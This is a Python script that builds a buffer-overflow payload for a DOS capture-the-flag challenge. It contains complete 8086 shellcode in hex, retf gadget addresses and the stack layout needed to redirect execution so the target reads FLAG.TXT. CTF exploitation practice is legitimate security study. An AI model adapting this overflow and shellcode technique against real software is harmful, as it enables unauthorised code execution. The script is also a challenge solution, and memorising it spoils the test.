#!/usr/bin/env python3
# Build the overflow payload (INPUT.TXT) for the End of Life challenge.
#
# Layout (name[17] is at [bp-0x12], saved BP at [bp], near RET at [bp+2]):
#   offset 0..15   'a'*16          passes check_input (16 letters, max)
#   offset 16      0x1A            Ctrl-Z: text-mode checker stops, binary
#                                  parser reads on
#   offset 17      'Z'             pad
#   offset 18..19  'QQ'            corrupt saved BP deliberately
#   offset 20..21  retf gadget     near RET target (an existing `retf` in image)
#   offset 22..23  far IP          popped by retf: (bp-0x12+where) & 0xFFFF
#   offset 24..25  far CS          popped by retf: SS
#   offset 26..    'Z'*(where-26)  pad to shellcode
#   offset where   shellcode       PIC 8086, INT 21h, reads FLAG.TXT into
#                                  OUTPUT.TXT (see build_payload.py source)
#
# BP (=0xFFF2) and SS (=0x3E1) come from calibrate.py under DOSBox.
#
# Usage:
#   python3 build_payload.py BP SS [output_input.txt]
import base64
import struct
import sys

# PIC 8086 shellcode: call $+5; pop si; lea dx,[si+0x45] ("FLAG.TXT");
# INT21 3Dh open / 3Fh read <=256 / 3Ch create OUTPUT.TXT / 40h write /
# 3Eh close / 4Ch exit. No 0x20 bytes anywhere (space terminates %[^ ]).
SHELLCODE = bytes.fromhex(
    'e800005e8d944500b8003d56cd215e723289c38d945900b90001b43f56cd215e7221'
    '89c58d944e0031c9b43c56cd215e721189c38d94590089e9b440cd21b43ecd2190'
    'b8004ccd21'
    '464c41472e545854004f55545055542e54585400'
) + b'\x00' * 256

# Existing `retf` (opcode CB) gadgets found in this CHALL.EXE build.
RETF_GADGETS = (0x986, 0x1141, 0x14dc)


def p16(n):
    return struct.pack('<H', n & 0xffff)


def main():
    if len(sys.argv) not in (3, 4):
        sys.exit('usage: build_payload.py BP SS [output.INPUT]')
    bp = int(sys.argv[1], 0) & 0xffff
    ss = int(sys.argv[2], 0) & 0xffff
    out = sys.argv[3] if len(sys.argv) > 3 else 'INPUT.TXT'

    made = False
    for where in range(32, 200):          # shellcode position in the overflow
        for gadget in RETF_GADGETS:
            ip = (bp - 0x12 + where) & 0xffff   # far IP for the shellcode
            raw = (b'a' * 16 + b'\x1a' + b'Z' + b'QQ'
                   + p16(gadget) + p16(ip) + p16(ss)
                   + b'Z' * (where - 26) + SHELLCODE)
            if 0x20 in raw:               # space byte would truncate fscanf
                continue
            open(out, 'wb').write(raw)
            open(out + '.b64', 'wb').write(base64.b64encode(raw) + b'\n')
            print('payload:', len(raw), 'bytes, retf=%#x, far=%#x:%#x, shell at +%d'
                  % (gadget, ss, ip, where))
            made = True
            break
        if made:
            break
    if not made:
        sys.exit('could not build a payload without a space byte')


if __name__ == '__main__':
    main()